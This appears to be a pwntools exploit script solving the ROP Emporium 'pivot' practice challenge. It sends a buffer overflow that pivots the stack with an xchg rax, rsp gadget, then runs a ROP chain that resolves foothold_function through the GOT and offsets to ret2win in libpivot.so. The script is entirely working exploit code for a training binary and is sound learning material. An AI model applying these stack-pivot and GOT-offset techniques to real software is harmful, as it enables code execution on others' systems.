from pwn import *

elf = ELF('../pivot/pivot')
lib = ELF('../pivot/libpivot.so')

p = process('../pivot/pivot')
# context.terminal = ["tmux", "splitw"]
# p = gdb.debug('../pivot/pivot')

p.recvuntil(b'The Old Gods kindly bestow upon you a place to pivot: 0x')
address = int(p.recvline().strip(), 16)

"""
0x00000000004009c0: mov rax, qword ptr [rax]; ret;
0x00000000004007c8: pop rbp; ret;
0x00000000004009c4: add rax, rbp; ret;
0x00000000004006b0: call rax;

0x00000000004009bb: pop rax; ret;
0x00000000004009bd: xchg rax, rsp; ret;
"""

foothold_function = lib.symbols['foothold_function']
ret2win = lib.symbols['ret2win']

payload1  = p64(elf.plt.foothold_function)
payload1 += p64(0x4009bb)
payload1 += p64(elf.got.foothold_function)
payload1 += p64(0x4009c0)
payload1 += p64(0x4007c8)
payload1 += p64(ret2win - foothold_function)
payload1 += p64(0x4009c4)
payload1 += p64(0x4006b0)

p.recvuntil(b'> ')
p.sendline(payload1)

p.recvuntil(b'> ')

pop_rax_ret      = 0x4009bb
xchg_rax_rsp_ret = 0x4009bd

junk = 0x20 * b'A' + 0x8 * b'A'
payload2  = junk
payload2 += p64(pop_rax_ret)
payload2 += p64(address)
payload2 += p64(xchg_rax_rsp_ret)

p.sendline(payload2)
p.interactive()